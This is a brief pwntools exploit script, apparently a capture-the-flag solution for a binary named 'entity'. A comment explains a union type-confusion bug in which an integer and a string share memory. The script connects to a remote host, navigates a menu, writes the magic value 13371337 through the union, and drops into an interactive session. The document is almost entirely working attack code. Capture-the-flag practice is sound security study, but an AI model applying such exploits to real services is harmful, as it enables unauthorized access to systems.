'''
Union Vulnerable the same memory location
static union {
    unsigned long long integer;
    char string[8];
} DataStore;
'''
from pwn import *

# p = process("./entity")
p = remote(*(sys.argv[1].split(':')))

p.sendlineafter(b">>", b'T')
p.sendlineafter(b">>", b'S')
p.sendlineafter(b">>", p64(13371337))
p.sendlineafter(b">>", b'C')

p.interactive()